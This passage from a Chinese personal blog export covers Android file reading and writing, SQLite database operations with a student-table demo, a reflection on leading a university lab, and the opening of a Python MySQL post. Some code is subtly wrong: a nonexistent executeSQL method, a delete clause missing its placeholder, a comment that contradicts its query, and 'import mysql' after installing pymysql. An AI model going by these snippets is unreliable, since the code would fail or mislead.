(FileNotFoundException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>读文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">readSDCardFile</span><span class="params">(String fileName)</span> </span>&#123;</div><div class="line">        </div><div class="line">    String res = <span class="keyword">null</span>;</div><div class="line">    File myfile = <span class="keyword">new</span> File(getSdCardPath(), fileName);</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(myfile);</div><div class="line">        <span class="keyword">int</span> length = fis.available();   <span class="comment">//得到数据长度</span></div><div class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[length];    <span class="comment">//开辟一个字节数组</span></div><div class="line">        fis.read(bytes);    <span class="comment">//读出数据</span></div><div class="line">        fis.close();    <span class="comment">//关闭数据流</span></div><div class="line">        res = <span class="keyword">new</span> String(bytes, <span class="string">"UTF-8"</span>);   <span class="comment">//将字符数组转换成字符串，指定编码为UTF-8</span></div><div class="line">    &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>删除文件</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteSDCardFile</span><span class="params">(String fileName)</span> </span>&#123;</div><div class="line">    File myfile = <span class="keyword">new</span> File(getSdCardPath(), fileName);</div><div class="line">    myfile.delete();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　除了上面讲到的读文件、写文件、删除文件外，File 对象还有创建文件、设置可读可写等方法，具体的可以自己取查看相应的文档。</p>
<h5 id="从-res-raw-中读取文件数据"><a href="#从-res-raw-中读取文件数据" class="headerlink" title="从 res/raw 中读取文件数据"></a>从 res/raw 中读取文件数据</h5><p>　　读取文本文件时需要考虑编码格式的问题。在简体中文 Windows 操作系统中，ANSI 编码代表 GBK 编码，文本文件保存时默认使用 ANSI 编码，所以在读取文件获取字符串时要使用 GBK 进行编码。以下代码以读取 txt 文件为例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getRawFile</span><span class="params">(<span class="keyword">int</span> resId)</span> </span>&#123;</div><div class="line"></div><div class="line">    String res = <span class="string">""</span>;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">// 得到资源中的Raw数据流</span></div><div class="line">        InputStream in = getResources().openRawResource(resId);</div><div class="line">        <span class="keyword">int</span> length = in.available();</div><div class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</div><div class="line">        <span class="comment">// 读取数据</span></div><div class="line">        in.read(bytes);</div><div class="line">        <span class="comment">// 依test.txt的编码类型选择合适的编码，如果不调整会乱码</span></div><div class="line">        res = EncodingUtils.getString(bytes, <span class="string">"GBK"</span>);</div><div class="line">        in.close();</div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="从-assets-中读取文件数据"><a href="#从-assets-中读取文件数据" class="headerlink" title="从 assets 中读取文件数据"></a>从 assets 中读取文件数据</h5><p>　　以下代码同样以读取 txt 文件为例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getAssertFile</span><span class="params">(String fileName)</span> </span>&#123;</div><div class="line"></div><div class="line">    String res = <span class="keyword">null</span>;  </div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="comment">// 得到资源中的asset数据流</span></div><div class="line">        InputStream in = getResources().getAssets().open(fileName);</div><div class="line">        <span class="keyword">int</span> length = in.available();</div><div class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</div><div class="line">        in.read(bytes);</div><div class="line">        in.close();</div><div class="line">        res = EncodingUtils.getString(bytes, <span class="string">"GBK"</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">        <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">        e.printStackTrace();</div><div class="line">    &#125;</div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　参考博客：</p>
<p>[1]<a href="http://blog.csdn.net/androidwifi/article/details/17725989/" target="_blank" rel="external">android中的文件操作详解以及内部存储和外部存储</a></p>
<p>[2] <a href="http://blog.csdn.net/hshm20517/article/details/6461890/" target="_blank" rel="external">android资源目录—assets与res/raw区别</a></p>
<p>[3] <a href="http://blog.csdn.net/ztp800201/article/details/7322110/" target="_blank" rel="external">Android - 文件读写操作 总结</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>文件</tag>
      </tags>
  </entry>
  <entry>
    <title>Android SQLite 基本操作详解</title>
    <url>/2016/07/26/Android%20SQLite%20%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>　　SQLite 是一个开源的嵌入式关系数据库，实现自包容、零配置、支持事务的 SQL 数据库引擎。 其特点是高度便携、使用方便、结构紧凑、高效、可靠。之前写过一个简单的 Android 记事本程序，使用过 SQLite 数据库，但是并没有真正理解并消化。前段时间认真学习了 Mysql 数据库的相关知识，对数据库有了更深入的认识，于是，也准备把 Android 这一块的 SQLite 数据库好好整理一下。</p>
<a id="more"></a>
<p>　　SQLite 支持的数据类型：</p>
<p>　　NULL(空值)、INTEGER(整型值)、REAL(浮点值)、TEXT(字符串值)、BLOB(二进制对象)</p>
<h4 id="数据库创建与管理"><a href="#数据库创建与管理" class="headerlink" title="数据库创建与管理"></a>数据库创建与管理</h4><p>　　使用辅助类 SQLiteOpenHelper 来管理数据库的创建和版本更新，在工程中新建一个类 SQLiteUtil 用于管理数据库，继承自 SQLiteOpenHelper。</p>
<h5 id="必须实现构造方法"><a href="#必须实现构造方法" class="headerlink" title="必须实现构造方法"></a>必须实现构造方法</h5><p>　　<code>public DatabaseHelper(Context context, String name, CursorFactory factory, int version)</code></p>
<h5 id="重写两个抽象方法"><a href="#重写两个抽象方法" class="headerlink" title="重写两个抽象方法"></a>重写两个抽象方法</h5><p>　　<code>public void onCreate(SQLiteDatabase db)</code> 方法当数据库第一次被建立的时候被执行，一般把创建表,初始化数据等操作放在这里。</p>
<p>　　<code>public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)</code> 方法，当数据库版本更新时会自动执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SQLiteUtil</span> <span class="keyword">extends</span> <span class="title">SQLiteOpenHelper</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TABLE_NAME_STUDENT = <span class="string">"student"</span>;</div><div class="line">    </div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String COLUMN_NAME_ID = <span class="string">"_id"</span>;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String COLUMN_NOTE_NO = <span class="string">"Sno"</span>;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String COLUMN_NOTE_NAME = <span class="string">"Sname"</span>;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String COLUMN_NOTE_AGE = <span class="string">"Sage"</span>;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String COLUMN_NOTE_SEX = <span class="string">"Ssex"</span>;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SQLiteUtil</span><span class="params">(Context context, String name, CursorFactory factory,<span class="keyword">int</span> version)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(context, name, factory, version);</div><div class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase db)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="comment">//在这里创建数据库，后文会用到</span></div><div class="line">        db.execSQL(<span class="string">"CREATE TABLE "</span> + TABLE_NAME_STUDENT + <span class="string">"("</span> </div><div class="line">                    + COLUMN_NAME_ID + <span class="string">" INTEGER PRIMARY KEY AUTOINCREMENT,"</span></div><div class="line">                    + COLUMN_NOTE_NO + <span class="string">" TEXT NOT NULL DEFAULT \"\","</span></div><div class="line">                    + COLUMN_NOTE_NAME + <span class="string">" TEXT NOT NULL DEFAULT \"\","</span> </div><div class="line">                    + COLUMN_NOTE_AGE + <span class="string">" INTEGER NOT NULL,"</span></div><div class="line">                    + COLUMN_NOTE_SEX + <span class="string">" TEXT NOT NULL DEFAULT \"男\""</span> </div><div class="line">                    + <span class="string">")"</span> );</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="keyword">int</span> oldVersion, <span class="keyword">int</span> newVersion)</span></span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        <span class="comment">//在这里更新数据库版本</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　在这个类被实例化的时候，系统会检测这个数据库是否存在，如果已经存在就不再创建，如果不存在则创建。还会检测数据库的版本，当版本号不同时会执行更新操作。</p>
<h4 id="数据库基本操作"><a href="#数据库基本操作" class="headerlink" title="数据库基本操作"></a>数据库基本操作</h4><p>　　SQLiteDataBase 类提供了大量的 API 来操控 SQLite 数据库,每一个 SQLiteDatabase 的实例就代表了一个数据库(对应底层的一个数据库文件)，一旦应用程序获得了 SQLiteDatabase 对象，就可以通过该对象来操作与之相对应的数据库。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">SQLiteUtil mSqLiteUtil = <span class="keyword">new</span> SQLiteUtil(<span class="keyword">this</span>, <span class="string">"fzy"</span>, <span class="keyword">null</span>, <span class="number">1</span>);</div><div class="line">SQLiteDatabase db = mSqLiteUtil.getWritableDatabase();  <span class="comment">//得到一个SQLiteDatabase对象</span></div></pre></td></tr></table></figure>
<h5 id="基本操作写法一"><a href="#基本操作写法一" class="headerlink" title="基本操作写法一"></a>基本操作写法一</h5><p>　　对于插入、删除和更新来说都可以通过 executeSQL 方法执行 sql 语句来实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">db.executeSQL(String sql);  </div><div class="line">db.executeSQL(String sql, Object[] bindArgs);  <span class="comment">//sql语句中使用占位符，然后第二个参数是实际的参数集</span></div></pre></td></tr></table></figure>
<p>　　查询可以使用 rawQuery 方法执行 sql 语句来实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">db.rawQuery(String sql, String[] selectionArgs);</div></pre></td></tr></table></figure>
<p>　　将所有的 SQL 语句都组织到一个字符串中，使用占位符代替实际参数，selectionArgs 就是占位符实际参数集。</p>
<h5 id="基本操作写法二"><a href="#基本操作写法二" class="headerlink" title="基本操作写法二"></a>基本操作写法二</h5><p>　　除了统一的形式之外，他们还有各自的操作方法：</p>
<ul>
<li>插入</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">db.insert(String table, String nullColumnHack, ContentValues values);</div></pre></td></tr></table></figure>
<p>　　第一个参数都是表示要操作的表名，第二个参数表示如果插入的数据每一列都为空的话，需要指定此行中某一列的名称，系统将此列设置为 NULL，不至于出现错误，第三个参数 ContentValues 类型的变量，是键值对组成的 Map，key 代表列名，value 代表该列要插入的值。</p>
<ul>
<li>删除</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">db.delete(String table, String whereClause, String whereArgs);</div></pre></td></tr></table></figure>
<p>　　第一个参数都是表示要操作的表名，第二个参数是用来指定删除条件，传递空值时将删除所有行，第三个参数是删除条件的数组值，将与第二个参数组成条件字符串。</p>
<ul>
<li>更新</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">db.update(String table, Contentvalues values, String whereClause, String whereArgs);</div></pre></td></tr></table></figure>
<p>　　第一个参数都是表示要操作的表，第二个参数 ContentValues 类型的变量，是键值对组成的 Map，key 代表列名，value 代表该列要插入的值。第三个参数用来指定更新条件，传递空值将更新所有行。第四个参数是更新条件的数组值，将与第三个参数组成条件字符串。</p>
<ul>
<li>查询</li>
</ul>
<p>　　查询有很多不同参数的方法，这里只列举一例，其他的可以参考官方文档查看。<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">db.query(String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy);</div></pre></td></tr></table></figure></p>
<p>　　第一个参数都是表示要操作的表名，第二个参数表示要查询的列所有名称集，第三个参数 selection 表示WHERE 之后的条件语句，可以使用占位符，groupBy 指定分组的列名，having 指定分组条件，配合 groupBy 使用，orderBy 指定排序的列名，limit 指定分页参数，distinct 可以指定 “true” 或 “false” 表示要不要过滤重复值。需要注意的是，selection、groupBy、having、orderBy、limit 这几个参数中不包括 “WHERE”、“GROUP BY”、“HAVING”、“ORDER BY”、“LIMIT” 等 SQL 关键字。</p>
<h5 id="结果集的处理"><a href="#结果集的处理" class="headerlink" title="结果集的处理"></a>结果集的处理</h5><p>　　最后，他们同时返回一个 Cursor 对象，代表数据集的游标，有点类似于 JavaSE 中的 ResultSet。</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>move(int offset)</td>
<td>以当前位置为参考,移动到指定行</td>
</tr>
<tr>
<td>moveToFirst()</td>
<td>移动到第一行 </td>
</tr>
<tr>
<td>moveToLast()</td>
<td>动到最后一行</td>
</tr>
<tr>
<td>moveToPosition(int position)</td>
<td>移动到指定行 </td>
</tr>
<tr>
<td>moveToPrevious()</td>
<td>移动到前一行  </td>
</tr>
<tr>
<td>moveToNext()</td>
<td>移动到下一行  </td>
</tr>
<tr>
<td>isFirst()</td>
<td>是否指向第一条  </td>
</tr>
<tr>
<td>isLast()</td>
<td>是否指向最后一条  </td>
</tr>
<tr>
<td>isBeforeFirst()</td>
<td>是否指向第一条之前  </td>
</tr>
<tr>
<td>isAfterLast()</td>
<td>是否指向最后一条之后  </td>
</tr>
<tr>
<td>isNull(int columnIndex)</td>
<td>指定列是否为空(列基数为0)  </td>
</tr>
<tr>
<td>isClosed()</td>
<td>游标是否已关闭  </td>
</tr>
<tr>
<td>getCount()</td>
<td>总数据项数  </td>
</tr>
<tr>
<td>getPosition()</td>
<td>返回当前游标所指向的行数  </td>
</tr>
<tr>
<td>getColumnIndex(String columnName)</td>
<td>返回某列名对应的列索引值  </td>
</tr>
<tr>
<td>getString(int columnIndex)</td>
<td>返回当前行指定列的值</td>
</tr>
</tbody>
</table>
<p>　　遍历结果集的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">Cursor cs = db.query(传入相关参数);     <span class="comment">//得到结果集</span></div><div class="line"><span class="keyword">if</span>(cs!=<span class="keyword">null</span>)&#123;</div><div class="line">    <span class="keyword">while</span>(cs.moveToNext())&#123;</div><div class="line">        cs.getString(cs.getColumnIndex(列名));  <span class="comment">//通过列名获得列索引，然后再取出其值</span></div><div class="line">        <span class="comment">//...获取更多的列值</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Demo演示"><a href="#Demo演示" class="headerlink" title="Demo演示"></a>Demo演示</h4><p>　　这篇博客准备很久了，之前只是知道怎么使用 Android 的 SQLite 数据库，并没有系统地去熟悉相关的知识，现在通过查看官方的 API 文档与别人的博客将这些知识整理了一下，自己写了一个小 Demo 来熟悉 Android 的 SQLite 数据库操作。</p>
<p>　　核心的代码（MainActivity.java）如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertData</span><span class="params">()</span> </span>&#123;  <span class="comment">//插入数据</span></div><div class="line"></div><div class="line">    <span class="comment">// 通过直接执行SQL语句来给学生表插入3条数据</span></div><div class="line">    db.execSQL(<span class="string">"INSERT INTO "</span> + SQLiteUtil.TABLE_NAME_STUDENT</div><div class="line">                + <span class="string">" (Sno,Sname,Sage,Ssex) VALUES ('2016001','fzy','22','男')"</span>);</div><div class="line">                db.execSQL(<span class="string">"INSERT INTO "</span> + SQLiteUtil.TABLE_NAME_STUDENT</div><div class="line">                + <span class="string">" (Sno,Sname,Sage,Ssex) VALUES ('2016002','qwe','20','女')"</span>);</div><div class="line">                db.execSQL(<span class="string">"INSERT INTO "</span> + SQLiteUtil.TABLE_NAME_STUDENT</div><div class="line">                + <span class="string">" (Sno,Sname,Sage,Ssex) VALUES ('2016003','asd','19','男')"</span>);</div><div class="line">    </div><div class="line">    <span class="comment">// 使用insert方法来给学生表插入一条记录</span></div><div class="line">    ContentValues cv = <span class="keyword">new</span> ContentValues();</div><div class="line">    cv.put(SQLiteUtil.COLUMN_NOTE_NO, <span class="string">"20160004"</span>);</div><div class="line">    cv.put(SQLiteUtil.COLUMN_NOTE_NAME, <span class="string">"rty"</span>);</div><div class="line">    cv.put(SQLiteUtil.COLUMN_NOTE_AGE, <span class="string">"24"</span>);</div><div class="line">    cv.put(SQLiteUtil.COLUMN_NOTE_SEX, <span class="string">"男"</span>);</div><div class="line">    db.insert(SQLiteUtil.TABLE_NAME_STUDENT, <span class="keyword">null</span>, cv);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteData</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">// 直接执行SQL语句删除学生表中Sage大于18的学生的所有信息</span></div><div class="line">    db.execSQL(<span class="string">"DELETE FROM "</span> + SQLiteUtil.TABLE_NAME_STUDENT + <span class="string">" WHERE Sage = 18"</span>);</div><div class="line">    </div><div class="line">    <span class="comment">// 使用delete方法来删除学生表中_id大于1的学生的所有信息</span></div><div class="line">    db.delete(SQLiteUtil.TABLE_NAME_STUDENT, <span class="string">"_id&gt;"</span>, <span class="keyword">new</span> String[] &#123; <span class="string">"1"</span> &#125;);</div><div class="line">&#125;</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateData</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">// 直接执行SQL语句表中Sno为20160002的学生的名字Sname更新为xxx</span></div><div class="line">    db.execSQL(<span class="string">"UPDATE "</span> + SQLiteUtil.TABLE_NAME_STUDENT + <span class="string">" SET Sname = 'xxx' WHERE Sno = '2016002'"</span>);</div><div class="line">    </div><div class="line">    <span class="comment">// 使用update方法来更新学生表中_id大于2的学生的年龄信息</span></div><div class="line">    ContentValues cv = <span class="keyword">new</span> ContentValues();</div><div class="line">    cv.put(SQLiteUtil.COLUMN_NOTE_AGE, <span class="string">"18"</span>);</div><div class="line">    db.update(SQLiteUtil.TABLE_NAME_STUDENT, cv, <span class="string">"_id&gt;?"</span>,</div><div class="line">    <span class="keyword">new</span> String[] &#123; <span class="string">"2"</span> &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">queryData</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">    Cursor cs = db.query(SQLiteUtil.TABLE_NAME_STUDENT, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>,<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</div><div class="line">    StringBuilder result = <span class="keyword">new</span> StringBuilder();</div><div class="line">    <span class="keyword">while</span> (cs.moveToNext()) &#123;   <span class="comment">//遍历结果集</span></div><div class="line">    String line = cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_NO))</div><div class="line">                    + cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_NAME))</div><div class="line">                    + cs.getInt(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_AGE))</div><div class="line">                    + cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_SEX)) + <span class="string">"\n"</span>;</div><div class="line">                    result.append(line);    </div><div class="line">    &#125;</div><div class="line">    mResult.setText(result);    <span class="comment">//使用TextView显示出来</span></div><div class="line">    cs.close();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　通过在按钮的监听事件中调用这些方法就可以实现我的 Demo 的功能，这个 Demo 主要是通过不同的方式来实践数据库的操作，比较简单。效果如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/26-1.jpg" alt="26-1"></p>
<h5 id="数据库管理工具"><a href="#数据库管理工具" class="headerlink" title="数据库管理工具"></a>数据库管理工具</h5><p>　　将程序运行在模拟器中后，我们可以打开 DDMS 工具看到我创建的数据库文件：fzy，将其导出到电脑，使用第三方工具查看。这里讲解一种比较方便的方法，直接使用 SDK 提供的数据库管理工具来操作，不需要每次更改都将数据库文件导出到 Windows，具体方法如下：</p>
<ol>
<li><p>打开 Windows 系统的 cmd 窗口</p>
</li>
<li><p>进入到你的 SDK 目录下的 platform-tools 目录下，输入如下命令：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">adb shell</div></pre></td></tr></table></figure>
<p>　　进入调试环境，然后输入如下命令进入到数据库文件夹：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">cd /data/data/包名/databases</div><div class="line">ls  //查看有哪些数据库文件</div></pre></td></tr></table></figure>
<p>　　然后，使用如下 sqlite 工具打开数据库文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">sqlite3 数据库文件名</div></pre></td></tr></table></figure>
<p>　　进入 sqlite3 命令行管理工具，可以通过以下命令进行操作，这与 mysql 数据库有些区别，命令都是以.号开。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.help 查看帮助</div><div class="line">.tables 查看数据库中存在的表</div></pre></td></tr></table></figure>
<p>　　然后就可以对相应的表执行 sql 语句啦！需要注意的是，sql 语句末尾需要加分号，sqlite 命令行工具的操作命令不需要加分号。如下图所示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/26-2.jpg" alt="26-2"></p>
<p>　　参考博客： </p>
<p>[1] <a href="http://blog.csdn.net/liuhe688/article/details/6715983/" target="_blank" rel="external">Android中SQLite应用详解</a><br>[2] <a href="http://blog.csdn.net/codeeer/article/details/30237597" target="_blank" rel="external">Android 操作SQLite基本用法</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>SQLite</tag>
      </tags>
  </entry>
  <entry>
    <title>每个认真生活的人，都值得被认真对待</title>
    <url>/2016/07/25/%E6%AF%8F%E4%B8%AA%E8%AE%A4%E7%9C%9F%E7%94%9F%E6%B4%BB%E7%9A%84%E4%BA%BA%EF%BC%8C%E9%83%BD%E5%80%BC%E5%BE%97%E8%A2%AB%E8%AE%A4%E7%9C%9F%E5%AF%B9%E5%BE%85/</url>
    <content><![CDATA[<p>　　突然，有那么一刻，我会特别想哭。平时，很少总结也很少煽情，现在，回想总结起来，带实验室的这一年里，收获很多，感慨也很多。</p>
<a id="more"></a> 
<p>　　这一年里，自己真的花了很多时间很多精力，想各种办法来带大家，虽然我现在也知道自己当时讲课讲得并不好，大家可能在我的课堂上并没有学到太多的东西，所以也很感谢大家能一直听我讲完。现在回想起来可能也是自己当时太急了，想尽快把大家都教会，所以课程讲得很快，也没有很好的考虑大家的感受。也因为深知责任重大，我将自己的很多时间都花在了这里。大三第一个学期，正在带14级的学弟学妹，平时上课，周末的时间都花在实验室，然而自己又报名了软考，那段时间，很纠结，要带大家就不能好好复习，结果第一次考果然没过，还好这学期顺利拿到了软件设计师的证。然后为了蓝桥杯的板子，压缩复习时间，到实验室和陈老师一起调试板子，都是为了大家能够有一个好的训练平台，拿个好的名次。想想，那些纠结的时候义无反顾的抉择又有多少人知道，现在想起来，真的很艰难。但是，看到现在实验室取得的成绩，我也是很感动的，毕竟努力有了收获。</p>
<p>　　其实，一年下来，坚持下来的人是一定有收获的。有的人慢慢的慢慢的就放弃了，很可惜，这一路上，见证了很多中途退出的人，我也曾经试图挽留，但是都没能留得住。或许，每个人都有每个人的理想。能够一直坚持下来的也算是一种缘分，因为已经不记得有多少个在203奋斗的深夜，不记得有多少一起开怀大笑的日子。也只有真正经常混在一起的这一群人才会有机会一起去聚餐了吧，在一起喝喝酒，聊聊天，就这样也挺好。</p>
<p>　　这一路走来，要感谢的人也很多。</p>
<p>　　首先就是一直给予我们支持的指导老师了，很感谢匡老师的到来，没有她也没有实验室的今天，曾经想要放弃的我，在匡老师的带领下一起把实验室带到今天的样子，没有她的支持也没有我当初努力的样子。还记得去北京参加蓝桥杯国赛的时候，比赛完感觉不太好，心情差极了，就怕对不起一直给我们支持和鼓励的匡老师，不过还好，虽然没拿一等奖，但是成绩也不坏。在实验室的管理方面，匡老师确实花了不少的功夫，在协调各个指导老师的时候，我也知道有多难，因为一个实验室五个指导老师，很多事情都需要去协调去处理。然后，就是一直带我们的陈老师了，这学期很多的比赛获奖都是在陈老师的带领下获得的，也确实，陈老师自己也付出了很多，这学期在实验室经常能见到他忙碌的身影，对于每个比赛他都认真对待，自然也能够获得不错的成绩。然后，很感谢陈老师能够和我一起把蓝桥杯的板子做好，这块板子确实起了很大的作用。技术方面，陈老师确实付出了不少，感谢！</p>
<p>　　其次，要感谢13级的这几个小伙伴，是你们的坚持，造就了实验室的今天，一直都是你们在支持着我，很感谢，没有你们的付出也没有实验室今天的成绩。看到现在大家的成长我也是很欣慰的，大家都要找工作了，希望大家都能有个美好的未来，说不定以后就是我的面试官了呢，哈哈。</p>
<p>　　最后，还是要感谢欧超、杨勇锋、李维维等学长为这个实验室的付出，没有你们的基础也没有实验室今天的发展。谢谢欧超学长带我走进这个实验室，带我学习单片机，谢谢杨勇锋学长为电子协会的辛勤付出，也谢谢李维维学长带了我几个假期，还谢谢其他学长平时对我的教导。没有一届一届的付出也就没有未来，希望这种精神能够一届届传递下去。</p>
<p>　　一直觉得自己是一个很幸运的人，因为大学三年来一直有老师的关心与支持，有学长学姐的帮助与指引，有小伙伴的共同努力，有学弟学妹们的支持。一直很相信一句话：每个认真生活的人，都值得被认真对待。希望你们也如此。</p>
<p>　　电子设计创新实验室的时光，谢谢有你！</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 操作 Mysql 数据库</title>
    <url>/2016/07/24/Python%20%E6%93%8D%E4%BD%9C%20Mysql%20%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>　　在正式开始 Python 网络爬虫实战之前，我们需要先来了解一下 Python 的一些基础知识，包括网络请求、数据存储以及异常处理等，这篇博客主要讲解 Python 的 Mysql 数据库操作，我们使用爬虫爬取下来的数据需要存储，而数据库就是常用的存储方式之一，所以熟练地掌握数据库操作对于网络爬虫的学习是很有必要的。</p>
<a id="more"></a>
<h4 id="安装访问数据库的类库"><a href="#安装访问数据库的类库" class="headerlink" title="安装访问数据库的类库"></a>安装访问数据库的类库</h4><p>　　Windows 下 cmd 直接执行如下命令进行安装：<br><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> pip install pymysql</span></div></pre></td></tr></table></figure></p>
<p>　　注：如果没有安装 pip 包管理器，请先安装 pip 才能用此命令安装 pymysql。</p>
<h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><h5 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> mysql</div></pre></td></tr></table></figure>
